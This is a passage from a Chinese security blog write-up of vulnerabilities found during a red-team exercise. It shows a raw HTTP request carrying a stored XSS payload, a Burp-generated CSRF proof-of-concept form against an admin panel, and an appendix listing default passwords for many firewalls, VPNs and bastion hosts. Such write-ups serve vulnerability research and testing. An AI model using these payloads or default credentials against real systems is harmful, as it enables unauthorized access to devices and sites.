<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /admin.php/category/add?dialog=1 HTTP/1.1</span><br><span class="line">Host: admin.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 233</span><br><span class="line">Origin: http://admin.com</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://admin.com/admin.php/category/add?dialog=1</span><br><span class="line">Cookie: PHPSESSID=ou6fjfn717lu02rfm9saqguca4; uid=3; token=f824ac8c-ac7b-4979-a89b-b47dd8e79226</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">row%5Btype%5D=default&amp;row%5Bpid%5D=0&amp;row%5Bname%5D=%3Cscript%3Ealert(1)%3C%2Fscript%3E&amp;row%5Bnickname%5D=123&amp;row%5Bimage%5D=1&amp;row%5Bkeywords%5D=123&amp;row%5Bde</span><br></pre></td></tr></table></figure>

<p><img src="/img/HW-Vuln/HW38.png"></p>
<h4 id="NO-3-1"><a href="#NO-3-1" class="headerlink" title="NO.3"></a>NO.3</h4><p>还存在CSRF漏洞：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://admin.com/admin.php/category/add?dialog=1&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;row<span class="symbol">&amp;#91;</span>type<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;default&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;row<span class="symbol">&amp;#91;</span>pid<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;row<span class="symbol">&amp;#91;</span>name<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span><span class="symbol">&amp;lt;</span><span class="symbol">&amp;#47;</span>script<span class="symbol">&amp;gt;</span>&quot;</span> /&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;row<span class="symbol">&amp;#91;</span>nickname<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;row<span class="symbol">&amp;#91;</span>image<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;row<span class="symbol">&amp;#91;</span>keywords<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;row<span class="symbol">&amp;#91;</span>description<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;row<span class="symbol">&amp;#91;</span>weigh<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;row<span class="symbol">&amp;#91;</span>status<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;normal&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;row<span class="symbol">&amp;#91;</span>flag<span class="symbol">&amp;#93;</span><span class="symbol">&amp;#91;</span><span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h2><p>一些弱口令字典:</p>
<ul>
<li><p>泛微OA默认system账号:system&#x2F;system</p>
</li>
<li><p>Apache DolphinScheduler:admin&#x2F;dolphinscheduler</p>
</li>
<li><p>天融信防火墙 用户名:superman 密码:talent</p>
</li>
<li><p>天融信防火墙 用户名:superman 密码:talent!23</p>
</li>
<li><p>联想网御防火墙 用户名:admin 密码:leadsec@7766、administrator、bane@7766</p>
</li>
<li><p>深信服防火墙 用户名:admin 密码:admin</p>
</li>
<li><p>启明星辰 用户名:admin 密码:bane@7766、admin@123</p>
</li>
<li><p>juniper 用户名:netscreen 密码:netscreen</p>
</li>
<li><p>Cisco 用户名:admin 密码:cisco</p>
</li>
<li><p>Huawei 用户名:admin 密码:Admin@123</p>
</li>
<li><p>H3C 用户名:admin 密码:admin</p>
</li>
<li><p>绿盟IPS 用户名:weboper 密码:weboper</p>
</li>
<li><p>网神防火墙GE1 用户名:admin 密码:firewall</p>
</li>
<li><p>深信服VPN:51111端口	密码:delanrecover</p>
</li>
<li><p>华为VPN 账号:root 密码:mduadmin</p>
</li>
<li><p>华为防火墙 账号:admin	密码:Admin@123</p>
</li>
<li><p>迪普 192.168.0.1 默认的用户名和密码(admin&#x2F;admin_default)</p>
</li>
<li><p>山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone</p>
</li>
<li><p>安恒的明御防火墙 admin&#x2F;adminadmin</p>
</li>
<li><p>某堡垒机 shterm&#x2F;shterm</p>
</li>
<li><p>天融信的vpn test&#x2F;123456</p>
</li>
<li><p>sysauditor&#x2F;sysauditor</p>
</li>
<li><p>sysmanager&#x2F;sysmanager</p>
</li>
<li><p>supervisor&#x2F;supervisor</p>
</li>
<li><p>maintainer&#x2F;maintainer</p>
</li>
<li><p>webpolicy&#x2F;webpolicy</p>
</li>
<li><p>sysadmin&#x2F;sysadmin</p>
</li>
<li><p>conadmin&#x2F;conadmin</p>
</li>
<li><p>supervis&#x2F;supervis</p>
</li>
<li><p>webaudit&#x2F;webaudit</p>
</li>
<li><p>sysadmin&#x2F;sysadmin</p>
</li>
<li><p>conadmin&#x2F;nsfocus</p>
</li>
<li><p>weboper&#x2F;weboper</p>
</li>
<li><p>auditor&#x2F;auditor</p>
</li>
<li><p>weboper&#x2F;weboper</p>
</li>
<li><p>nsadmin&#x2F;nsadmin</p>
</li>
<li><p>admin&#x2F;nsfocus</p>
</li>
<li><p>admin&#x2F;admin</p>
</li>
<li><p>shell&#x2F;shell</p>
</li>
</ul>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ColdSnap</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://coldwave96.github.io/2020/10/10/HW-Vuln/">https://coldwave96.github.io/2020/10/10/HW-Vuln/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://coldwave96.github.io">ColdSnap の Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/RCE/">RCE</a><a class="post-meta__tags" href="/tags/SQL-Injection/">SQL Injection</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/10/20/ItemBoard/"><i class="fa fa-chevron-left">  </i><span>Jarvis OJ - ItemBoard の Write-Up</span></a></div><div class="next-post pull-right"><a href="/2020/09/08/61DCTF-fm/"><span>61DCTF fm の Write-Up</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'false' == 'true';
var verify = 'false' == 'true';
var record_ip = '' == 'true';
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  recordIP:record_ip,
  appId:'R82KAmOmkqMWNJs72Fx4ub1O-gzGzoHsz',
  appKey:'Sq4B8VcTqxJ2qCeJLJa3KbKz',
  placeholder:'Please leave something ^.^',
  avatar:'mm',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(/img/background.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2025 By ColdSnap</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="icp"><a><span>Welcome to my world ^.^</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.8.2"></script><script src="/js/fancybox.js?version=1.8.2"></script><script src="/js/sidebar.js?version=1.8.2"></script><script src="/js/copy.js?version=1.8.2"></script><script src="/js/fireworks.js?version=1.8.2"></script><script src="/js/transition.js?version=1.8.2"></script><script src="/js/scroll.js?version=1.8.2"></script><script src="/js/head.js?version=1.8.2"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>